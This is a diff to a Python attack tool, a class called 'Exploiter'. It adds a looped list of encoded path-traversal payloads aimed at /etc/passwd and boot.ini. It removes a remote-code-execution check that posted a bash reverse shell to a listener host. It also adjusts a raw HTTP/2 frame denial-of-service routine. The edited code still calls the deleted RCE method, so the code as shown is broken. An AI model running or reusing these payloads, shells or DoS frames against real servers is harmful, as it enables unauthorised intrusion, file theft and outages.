@@ -82,37 +82,32 @@ class Exploiter:
 
     # Path Traversal Check
     def check_pathtraversal(self):
+        print(f"[*] Checking for path traversal vulnerabilities on {self.url}")
 
-        if not hasattr(self, 'url') or not self.url:
-            print("[!] Error: Target URL is not defined.")
-        return
-        target = f"{self.url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
+        payloads = [
+            "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
+            "/../../../../../../etc/passwd",
+            "/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+            "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+            "/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/passwd",
+            "/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
+            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini",
+            "/..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
+            "/..;/..;/..;/..;/etc/passwd"
+        ]
 
-    try:
-        response = requests.get(target, headers=self.headers, timeout=self.timeout, verify=False)
-        if "root:x:" in response.text:
-            print("[+] Path traversal vulnerability found!")
-        else:
-            print("[-] No path traversal vulnerability detected.")
-    except Exception as e:
-        print(f"[!] Error: {e}")
+        for payload in payloads:
+            target = f"{self.url}{payload}"
+            try:
+                response = requests.get(target, headers=self.headers, timeout=self.timeout, verify=False)
+                if "root:x:" in response.text or "Administrator" in response.text:
+                    print(f"[+] Path traversal vulnerability found with payload: {payload}")
+                else:
+                    print(f"[-] Payload not vulnerable: {payload}")
+            except Exception as e:
+                print(f"[!] Error with payload {payload}: {e}")
 
-
-    # Remote Code Execution Check
-    def check_rce(self):
-        print(f"[*] Checking for remote code execution vulnerability on {self.url}")
-        target = f"{self.url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
-        payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
-        data = {"echo": payload}
-
-        try:
-            response = requests.post(target, data=data, headers=self.headers, timeout=self.timeout)
-            if response.status_code == 200:
-                print("[+] Remote code execution vulnerability found! RCE triggered.")
-            else:
-                print("[-] No remote code execution vulnerability detected.")
-        except Exception as e:
-            print(f"[!] Error: {e}")
 
     # Apache Struts RCE Check
     def check_apache_struts_rce(self):
@@ -135,9 +130,10 @@ class Exploiter:
     def check_dosattack(self):
         print(f"[*] Checking for DoS vulnerability on {self.url}")
         try:
+            hostname = self.url.split("//")[-1].split("/")[0]  # Extract hostname or IP
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(self.timeout)
-            s.connect((self.url, self.port))
+            s.connect((hostname, self.port))
 
             s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
             SETTINGS = struct.pack('3B', 0x00, 0x00, 0x00) + struct.pack('B', 0x04) + struct.pack('B', 0x00) + struct.pack('>I', 0x00000000)
@@ -147,10 +143,14 @@ class Exploiter:
                 HEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:] + struct.pack('B', 0x09) + struct.pack('B', 0x01) + struct.pack('>I', 0x00000001)
                 s.sendall(HEADERS + HEADER_BLOCK_FRAME)
 
+        except BrokenPipeError:
+            print("[!] Connection was forcibly closed by the server (Broken Pipe).")
         except Exception as e:
             print(f"[!] Error: {e}")
         finally:
             s.close()
+
+
 
     def run_checks(self):
         self.check_pathtraversal()
@@ -158,6 +158,7 @@ class Exploiter:
             self.check_rce()
             self.check_apache_struts_rce()
         self.check_dosattack()
+
 
 if __name__ == '__main__':
     header()
